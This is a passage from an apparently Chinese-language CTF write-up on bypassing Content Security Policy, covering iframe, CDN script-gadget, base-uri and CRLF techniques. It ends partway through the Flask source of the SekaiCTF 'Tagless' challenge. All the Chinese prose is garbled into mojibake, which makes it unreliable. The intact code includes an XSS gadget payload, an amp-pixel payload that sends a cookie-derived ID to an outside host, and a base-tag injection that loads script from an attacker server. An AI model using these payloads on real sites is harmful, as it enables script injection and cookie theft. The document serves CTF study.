<p>å½“ç„¶ä¹Ÿå¯ä»¥å¼¹çª—è¾“å‡ºã€‚è¿™é‡ŒåŠ çš„setTimeout()å‡½æ•°ï¼Œæ˜¯ä¸ºäº†è®©index.htmlæ–‡æ¡£åŠ è½½å®Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œå¿…é¡»è¦åœ¨scriptæ ‡ç­¾å¤–é¢å¥—ä¸€ä¸ªbodyæ ‡ç­¾ï¼Œè¿™æ ·æ‰èƒ½æˆåŠŸåŠ è½½ï¼Œ<strong>å¯èƒ½çš„åŸå› å¦‚ä¸‹</strong>ï¼š</p>
<p>æ˜¯å› ä¸ºHTMLæ–‡æ¡£çš„è§£ææ˜¯ä»ä¸Šåˆ°ä¸‹æ‰§è¡Œçš„ï¼Œå½“è§£æåˆ°<code>&lt;script&gt;</code>æ ‡ç­¾æ—¶ï¼Œä¼šé©¬ä¸Šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œå…¶å®ç›¸å½“äºæŠŠscriptæ”¾åœ¨<code>&lt;body&gt;</code>æ ‡ç­¾å‰è§£æï¼Œä½†æ˜¯æ³¨æ„æˆ‘ä»¬åˆ©ç”¨ä»£ç ä¸­çš„ä¸€æ­¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">document.body
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå…¶å®æ˜¯è°ƒç”¨åˆ°äº†DOMçš„ä¸€ä¸ªå¯¹è±¡ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œå¿…é¡»è¦å°†å…¶æ”¾åœ¨<code>&lt;body&gt;</code>æ ‡ç­¾ä¸­ï¼Œç®€å•ç»™ä¸ªä»£ç å¯¹æ¯”ä¸€ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span> <span class="c1">// è¾“å‡º &lt;body&gt; å…ƒç´ 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/body&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span> <span class="c1">// è¾“å‡º null
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/head&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;&lt;</span><span class="err">/body&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»“æœå¦‚ä¸Šï¼Œç®€å•ç†è§£ä¸€ä¸‹å°±è¡Œã€‚</p>
<p>å¦‚æœå¯ä»¥çš„è¯ï¼Œå¯ä»¥å°è¯•ç›´æ¥å†™iframeæ ‡ç­¾çš„ä»£ç ï¼Œä¸ç”¨å†ç”¨jsä»£ç æ¥æ„é€ ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;index.html&#34;</span> <span class="nx">title</span><span class="o">=</span><span class="s2">&#34;iframe Example&#34;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&#34;400&#34;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&#34;300&#34;</span><span class="o">&gt;&lt;</span><span class="err">/iframe&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±ç›´æ¥è·å–åˆ°äº†å†…å®¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502132058227.png"
	
	
	
	loading="lazy"
	
		alt="image-20250213205822178"
	
	
></p>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯</strong>ï¼šè¿™é‡Œçš„srcå¯ä»¥æ˜¯ä¸€ä¸ªurlã€‚</p>
<p>åˆ©ç”¨åœºæ™¯ï¼š</p>
<p>ä¸¤ä¸ªé¡µé¢ï¼Œå…¶ä¸­ä¸€ä¸ªé¡µé¢å¯æ§ï¼Œå¹¶ä¸”å­˜åœ¨XSSæ¼æ´ï¼Œè¿™æ ·å¯è®¿é—®å­˜åœ¨CSPçš„é¡µé¢çš„å†…å®¹ã€‚</p>
<p>è¿™ä¸ªæ ‡ç­¾è¿˜æœ‰å¾ˆå¤šæŠ€å·§ï¼Œæ¯”å¦‚å®ƒçš„<code>srcdoc</code>å±æ€§ç­‰ã€‚å¯ä»¥çœ‹ä¸‹é¢çš„ä¾‹é¢˜åˆ†äº«ã€‚</p>
<p>å¯¹äº<code>&lt;iframe&gt;</code>æ ‡ç­¾ã€‚è¿˜æœ‰çš„æ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹å¯ä»¥çœ‹çœ‹å¦‚ä¸‹æ–‡ç« ï¼š</p>
<p><a class="link" href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox"  target="_blank" rel="noopener"
    >https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox</a></p>
<h6 id="cdnç»•è¿‡">CDNç»•è¿‡
</h6><p>ä¸€èˆ¬å‰ç«¯éƒ½ä¼šç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œç®€å•æ¥è¯´å…¶å®å°±æ˜¯æœ‰äº›å‰ç«¯ä¼šåº”ç”¨å…¶ä»–CDNä¸Šçš„JSæ¡†æ¶ï¼Œä½†æ˜¯å¦‚æœå¼•ç”¨çš„CDNçš„æ¡†æ¶å­˜åœ¨ä»€ä¹ˆè‡ªå®šä¹‰çš„æ ‡ç­¾æˆ–å…¶ä»–å®šä¹‰ï¼Œå¯ä»¥è·å–cookieç­‰æ“ä½œï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªCDNæ¥ç»•è¿‡CSPã€‚</p>
<p>ä½†æ˜¯è¿™ä¸ªçš„ç»•è¿‡å°±ä¸€èˆ¬éœ€è¦æ‰¾å†å²æ¼æ´ï¼Œæˆ–è€…æ˜¯æŒ–ä¸€ä¸ª0dayå‡ºæ¥ï¼Œç®€å•è®°å½•ä¸€ä¸‹ï¼š</p>
<p>å¦‚æœç”¨äº†Jquery-mobileåº“ï¼Œä¸”CSPä¸­åŒ…å«<code>script-src 'unsafe-eval</code>æˆ–è€…<code>script-src 'strict-dynamic'</code>ï¼Œå¯ä»¥ç”¨æ­¤expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>blackhat2017æœ‰ç¯‡pptæ€»ç»“äº†å¯ä»¥è¢«ç”¨æ¥ç»•è¿‡CSPçš„ä¸€äº›JSåº“ï¼š</p>
<p>ã€Š<a class="link" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf"  target="_blank" rel="noopener"
    >Breaking XSS mitigations via Script Gadgets</a>ã€‹</p>
<p>è¿˜æœ‰RCTF2018çš„AMPé¢˜å‡ºç°äº†è¿™ä¸ªçš„åˆ©ç”¨ã€‚ä¸»è¦è¿˜æ˜¯å› ä¸ºAMPè‡ªå·±æä¾›çš„ç»„ä»¶ï¼š<code>&lt;amp-pixel&gt;</code>ã€‚å¯ä»¥è·å–åˆ°cookieå¹¶å‘æŒ‡å®šçš„ç½‘å€å‘é€è¯·æ±‚ã€‚</p>
<p>ç®€å•è¯´è¯´è‡ªå·±çš„ç†è§£ï¼Œé¢˜ç›®dockeræœ‰ç‚¹é—®é¢˜ï¼Œå°±æ²¡æœ‰æ‹‰èµ·æ¥è¯•è¯•æ€ä¹ˆæ‰“äº†ï¼š</p>
<p>CSPé™åˆ¶ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">script-src &#39;nonce-88f68fa5b7eb8a01de8b8e63b5fb0a6e&#39; &#39;strict-dynamic&#39;; style-src &#39;unsafe-inline&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°å¯¹scriptè¿›è¡Œäº†é™åˆ¶ï¼Œç„¶åå¯¹style-srcè¿›è¡Œäº†é™åˆ¶ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰å¯¹img-srcè¿›è¡Œé™åˆ¶ï¼Œç„¶åæ²¡æœ‰å®šä¹‰default-srcï¼Œè¿™é‡Œä¸ªäººè®¤ä¸ºçš„å¯èƒ½çš„åŸå› æ˜¯è¿™ä¸ª<code>&lt;amp-pixel&gt;</code>ç»„ä»¶æ˜¯ç”±img-srcæ¥å®šä¹‰çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502132254806.png"
	
	
	
	loading="lazy"
	
		alt="image-20250213225444753"
	
	
></p>
<p>æœ€åçš„payloadå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">amp</span><span class="o">-</span><span class="nx">pixel</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://foo.com/pixel?cid=CLIENT_ID(site-user-id-cookie-fallback-name)&#34;</span><span class="o">&gt;&lt;</span><span class="err">/amp-pixel&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä»–çš„è¯´æ˜å…·ä½“å‚è€ƒå¦‚ä¸‹å®˜æ–¹æ–‡ç« è¯´æ˜ï¼š</p>
<p>ã€Š<a class="link" href="https://amp.dev/zh_cn/documentation/guides-and-tutorials/optimize-and-measure/configure-analytics/analytics_basics#%E7%AE%80%E5%8D%95%E7%9A%84-amp-pixel-%E9%85%8D%E7%BD%AE"  target="_blank" rel="noopener"
    >Analytics: the basics</a>ã€‹</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>å¯ä»¥å»çœ‹çœ‹è¿™é“é¢˜çš„wpã€‚</p>
<h6 id="base-uriç»•è¿‡">Base-uriç»•è¿‡
</h6><p>base-uriçš„ç»•è¿‡ï¼Œåœ¨RCTF2018 rBlogçš„éé¢„æœŸè§£ï¼Œæ²¡æ‰¾åˆ°dockerï¼Œè¿™é‡Œå°±ç®€å•è®²è®²ç†è§£ã€‚ä»¥åŠwpä¸­çš„æœ‰æ„æ€çš„ç‚¹ã€‚</p>
<p>è¿™é‡Œæåˆ°äº†ä¸€ä¸ªbase-uriï¼Œè¿™æ˜¯ä¸€ä¸ªæ§åˆ¶<code>&lt;base&gt;</code>æ ‡çš„CSPæŒ‡ä»¤ï¼Œå¯¹äº<code>&lt;base&gt;</code>æ ‡ç­¾çš„å®šä¹‰ï¼Œå¯ä»¥çŸ¥é“çš„æ˜¯ï¼š</p>
<ul>
<li>ä¸ºé¡µé¢ä¸Šçš„æ‰€æœ‰çš„<strong>ç›¸å¯¹é“¾æ¥</strong>è§„å®šé»˜è®¤URLæˆ–é»˜è®¤ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šå°†æ¯”å¦‚<code>&lt;script&gt;</code>ã€<code>&lt;a&gt;</code>ç­‰æ ‡ç­¾é‡ŒæŒ‡å‘çš„ç›¸å¯¹URLéƒ½ä¼šæŒ‡å‘<code>&lt;base&gt;</code>æ ‡ç­¾ä¸­çš„ç›¸å¯¹URLã€‚</li>
<li>å¿…é¡»ä½äº<code>&lt;head&gt;</code>å…ƒç´ å†…éƒ¨ï¼Œä¸€èˆ¬æ˜¯é å‰çš„éƒ¨åˆ†ã€‚</li>
<li>ä¸€ä¸ªæ–‡æ¡£åªæœ‰ä¸€ä¸ª<code>&lt;base&gt;</code>æ ‡ç­¾ï¼ˆéå¸¸é‡è¦ï¼Œå¦‚æœä¸èƒ½è¦†ç›–æ‰åŸæœ‰çš„ï¼Œé‚£ä¹ˆå°±ä¸èƒ½åˆ©ç”¨äº†ï¼‰</li>
</ul>
<p>ç®€å•è§£é‡Šä¸€ä¸‹<code>&lt;base&gt;</code>æ ‡ç­¾çš„ä½¿ç”¨è§„åˆ™ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">base</span><span class="w"> </span><span class="n">href</span><span class="o">=</span><span class="s">&#34;//vps_ip/&#34;</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">script</span><span class="w"> </span><span class="n">nonce</span><span class="o">=</span><span class="err">&#39;</span><span class="n">test</span><span class="err">&#39;</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="s">&#34;app.js&#34;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¦‚ä¸Šè®¾ç½®ï¼Œé‚£ä¹ˆ<code>&lt;script&gt;</code>åŠ è½½jsæ–‡ä»¶æ—¶å°±ä¼šå»è®¿é—® <code>http://vps_ip/app.js</code>ã€‚æ‰€ä»¥å¦‚æœæƒ³è¦åˆ©ç”¨çš„è¯ï¼Œéœ€è¦åœ¨è‡ªå·±çš„vpsä¸Šåˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶ï¼Œæ”¾è¿›jsä»£ç å³å¯ã€‚</p>
<p>ä½†æ˜¯æœ¬åœ°æµ‹è¯•å¦‚ä¸‹å‘ç°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">base</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;//47.100.223.173/&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#39;test&#39;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;app.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·åœ¨<code>&lt;body&gt;</code>ä¸­è¿˜æ˜¯èƒ½åŠ è½½åˆ°app.jsï¼Ÿè¾©è¯çœ‹å¾…å§ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåº”è¯¥æ˜¯è§£æé¡ºåºçš„åŸå› ï¼Œè¿™é‡Œéœ€è¦è¦åˆ©ç”¨çš„<code>&lt;script&gt;</code>æ ‡ç­¾æ˜¯åœ¨<code>&lt;base&gt;</code>æ ‡ç­¾ä¸‹é¢ã€‚</p>
<p><strong>å¯¹äºbase-uri</strong>ï¼Œå¦‚ä¸‹è§£é‡Šæ–‡ç« ï¼š</p>
<p>ã€Š<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/base-uri"  target="_blank" rel="noopener"
    >CSP: base-uri</a>ã€‹</p>
<p>é‡Œé¢æåˆ°äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502141543485.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>default-srcï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„ï¼Œå½“æˆ‘ä»¬å¹¶æ²¡æœ‰æ˜¾å¼åœ°å®šä¹‰ä¸€ä¸ªæŒ‡ä»¤ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šç›´æ¥å›è½è¿™ä¸ªdefault-srcå®šä¹‰çš„å†…å®¹ã€‚è¿™ä¸ªæ˜¯éå¸¸é‡è¦çš„åˆ©ç”¨ç‚¹ã€‚</p>
<p>é™¤äº†base-uriï¼Œè¿˜æœ‰å…¶ä»–å¦‚form-actionã€frame-ancestorsç­‰æŒ‡ä»¤ã€‚</p>
<p>æ‰€ä»¥è¿™ä¸ªæ–¹æ³•çš„åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
<li>èƒ½åœ¨<code>&lt;head&gt;</code>ä¸­æ’å…¥<code>&lt;base&gt;</code>æ ‡ç­¾</li>
<li>èƒ½æ‰§è¡Œçš„<code>&lt;script&gt;</code>æ ‡ç­¾ä¸€å®šè‡³å°‘æ»¡è¶³<code>script-src</code>ä¸­çš„ä¸€ä¸ªæ¡ä»¶</li>
<li>æ²¡æœ‰æ˜¾å¼è®¾ç½®base-uri</li>
<li>é¡µé¢å¼•ç”¨å­˜åœ¨ç›¸å¯¹è·¯å¾„çš„<code>&lt;script&gt;</code>æ ‡ç­¾</li>
</ul>
<p>RCTFçš„CSPé™åˆ¶å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-720f7efdee4d8940dc71ef5190d6f266&#39;; frame-src https://www.google.com/recaptcha/; style-src &#39;self&#39; &#39;unsafe-inline&#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src &#39;self&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ­¤æ—¶å¯ä»¥ç”¨ <a class="link" href="https://csp-evaluator.withgoogle.com/"  target="_blank" rel="noopener"
    >CSP Evaluator</a> ç½‘ç«™ç®€å•æ£€æµ‹ä¸€ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502141719910.png"
	
	
	
	loading="lazy"
	
		alt="image-20250214171904774"
	
	
></p>
<p>å¯ä»¥æ‰“base-uriï¼Œå…·ä½“çš„åŸç†å…¶å®å°±æ˜¯å‰é¢è¯´çš„ï¼Œåœ¨æ ‡é¢˜å¤„æ’å…¥<code>&lt;base&gt;</code>ï¼Œç„¶åé€šè¿‡åŠ è½½jsæ–‡ä»¶æ¥æ‰“ã€‚</p>
<p>è¿™é“é¢˜çš„wpå¦‚ä¸‹æ–‡ç« æ¯”è¾ƒè¯¦ç»†ï¼š</p>
<p><a class="link" href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup"  target="_blank" rel="noopener"
    >https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup</a></p>
<h6 id="crlfç»•è¿‡">CRLFç»•è¿‡
</h6><p>HCTF2018çš„ä¸€é“é¢˜ï¼Œå½“ä¸€ä¸ªé¡µé¢å­˜åœ¨CRLFæ¼æ´æ—¶ï¼Œå¹¶ä¸”å¯æ§ç‚¹åœ¨CSPä¸Šæ–¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ¢è¡Œï¼Œå°†CSPæŒ¤åˆ°HTTPè¿”å›ä½“ä¸­ï¼Œè¿™æ ·æ¥ç»•è¿‡CSPã€‚</p>
<p>è¿™é‡Œä¸»è¦çš„åˆ©ç”¨æ‰‹æ³•æ˜¯ï¼Œå‰é¢è¯´äº†çš„ï¼Œå¦‚æœæ˜¯ä½¿ç”¨<code>&lt;meta&gt;</code>æ ‡ç­¾ï¼Œéœ€è¦åœ¨<code>&lt;head&gt;</code>ä¸­æ¥å®šä¹‰ï¼Œå¹¶ä¸”åœ¨<code>&lt;body&gt;</code>ä¸­çš„CSPè®¾ç½®æ˜¯ä¼šè¢«å¿½ç•¥çš„ã€‚</p>
<p>å…·ä½“åˆ©ç”¨å°±ç½‘ä¸Šæœwpçœ‹å§ã€‚</p>
<p>é¢˜ç›®åœ°å€ï¼šhttps://github.com/Lou00/HCTF2018_Bottleï¼Œä½†æ˜¯æœ‰ç‚¹è€äº†ï¼Œdockeræ‹‰ä¸èµ·æ¥ï¼Œæ²¡æ­ç¯å¢ƒå¤ç°ã€‚</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>ç­‰è¿˜æœ‰å¾ˆå¤šç»•è¿‡æ–¹å¼ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œå…·ä½“å¯ä»¥çœ‹å‚è€ƒæ–‡ç« ä¸­çš„å…ˆçŸ¥ç¤¾åŒºçš„æ–‡ç« ï¼Œè¿˜æ˜¯æ¯”è¾ƒå…¨é¢çš„ã€‚</p>
<h3 id="ä¾‹é¢˜åˆ†äº«">ä¾‹é¢˜åˆ†äº«
</h3><h4 id="tagless">Tagless
</h4><p>SekaiCTF 2024 çš„é¢˜ï¼Œé¢˜ç›®ç¯å¢ƒï¼šhttps://github.com/project-sekai-ctf/sekaictf-2024?tab=readme-ov-file</p>
<p>â€”â€”â€”â€”â€”â€”</p>
<p>å¼€é¢˜å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502152047744.png"
	
	
	
	loading="lazy"
	
		alt="image-20250215204705682"
	
	
></p>
<p>æ— æ ‡ç­¾æ˜¾ç¤ºå™¨ï¼Œå°è¯•å¾€é‡Œé¢æ’å…¥æ ‡ç­¾ï¼Œæ²¡æœ‰æ˜¾ç¤ºã€‚çœ‹äº†ä¸€ä¸‹æ’å…¥ä½ç½®ï¼Œæ˜¯åœ¨<code>&lt;body&gt;</code>ä¸­ã€‚ç»™dockeræºä»£ç ï¼Œç›´æ¥å¼€å®¡ã€‚æ„Ÿè§‰æ˜¯ä¸€ä¸ªXSSã€‚</p>
<p>ap.pyæ–‡ä»¶ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bot</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">,</span> <span class="n">static_folder</span><span class="o">=</span><span class="s1">&#39;static&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_security_headers</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;script-src &#39;self&#39;; style-src &#39;self&#39; https://fonts.googleapis.com https://unpkg.com &#39;unsafe-inline&#39;; font-src https://fonts.gstatic.com;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/report&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;POST&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">bot</span> <span class="o">=</span> <span class="n">Bot</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
